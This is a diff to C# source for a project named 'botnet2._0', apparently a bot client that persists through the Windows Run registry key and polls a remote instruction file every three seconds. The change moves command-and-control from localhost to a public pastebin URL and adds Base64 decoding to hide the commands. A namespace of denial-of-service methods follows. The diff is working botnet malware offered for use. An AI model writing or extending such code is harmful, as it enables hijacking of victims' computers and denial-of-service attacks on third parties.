@@ -16,7 +16,7 @@ namespace botnet2._0
     {
         public static string exe_name = Path.GetFileName(System.Reflection.Assembly.GetEntryAssembly().Location);
         public static Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-        public static string Instruction_File = "http://127.0.0.1/instructions.txt";
+        public static string Instruction_File = "https://pastebin.com/raw/JiA7hhwD";
 
 
         public static bool add()
@@ -51,9 +51,14 @@ namespace botnet2._0
         {
             while (true)
             {
-                Form1.botinstruction = JsonConvert.DeserializeObject<Instruction>(new WebClient().DownloadString(functions.Instruction_File));
+                Form1.botinstruction = JsonConvert.DeserializeObject<Instruction>(Base64Decode(new WebClient().DownloadString(functions.Instruction_File)));
                 System.Threading.Thread.Sleep(3000);
             }
+        }
+        public static string Base64Decode(string base64EncodedData)
+        {
+            var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
+            return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
         }
     }
     namespace dos_methods
